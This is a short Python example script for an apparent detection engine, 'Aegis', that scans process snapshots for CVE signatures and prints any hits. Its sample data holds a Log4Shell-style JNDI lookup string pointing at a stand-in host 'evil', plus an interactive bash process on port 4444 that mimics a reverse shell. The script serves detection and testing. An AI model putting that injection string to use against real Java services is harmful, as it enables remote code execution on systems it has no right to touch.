import os as _os, sys as _sys
_sys.path.insert(0, _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))

"""示例：扫描进程快照，命中 CVE 特征则打印检测结果。"""
from aegis.api import Aegis

engine = Aegis()
snapshots = [
    {"cmdline": "java -jar app.jar",
     "argv": ["java", "-jar", "app.jar", "${jndi:ldap://evil/x}"]},
    {"cmdline": "/bin/bash -i",
     "argv": ["bash", "-i"], "ports": [4444]},
    {"cmdline": "nginx -g daemon off;", "argv": ["nginx"]},
]

for snap in snapshots:
    dets = engine.scan(snap)
    print(f"snapshot: {snap.get('cmdline')!r}")
    if not dets:
        print("  无命中")
        continue
    for d in dets:
        print(f"  -> {d}")
